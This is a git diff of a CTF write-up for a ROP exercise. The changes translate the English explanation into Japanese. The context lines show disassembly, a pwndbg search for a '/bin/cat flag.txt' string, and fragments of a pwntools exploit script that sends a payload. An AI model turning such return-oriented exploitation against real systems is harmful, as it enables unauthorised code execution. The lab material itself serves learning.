@@ -11,7 +11,7 @@ Stripped:   No
 ```
 
 ### Solution
-`usefulFunction`: run `system` with `/bin/ls` string.
+`usefulFunction`: `system('/bin/ls')`を実行
 ```asm
 0000000000400742 <usefulFunction>:
   400742:	55                   	push   rbp
@@ -25,7 +25,7 @@ Stripped:   No
   40075a:	00 00 00 
   40075d:	0f 1f 00             	nop    DWORD PTR [rax]
 ```
-there is `/bin/cat flag.txt` string at `0x601060`.
+`/bin/cat flag.txt` が `0x601060`にある
 ```shell
 pwndbg> search -t string "/bin/cat flag.txt"
 Searching for string: b'/bin/cat flag.txt\x00'
@@ -67,7 +67,7 @@ conn.sendafter('> ', payload)
 conn.interactive()
 ```
 
-if use pwntools `ELF` module, it can be more readable.
+pwntoolsの`ELF`を使うと
 ```python
 from pwn import *
 
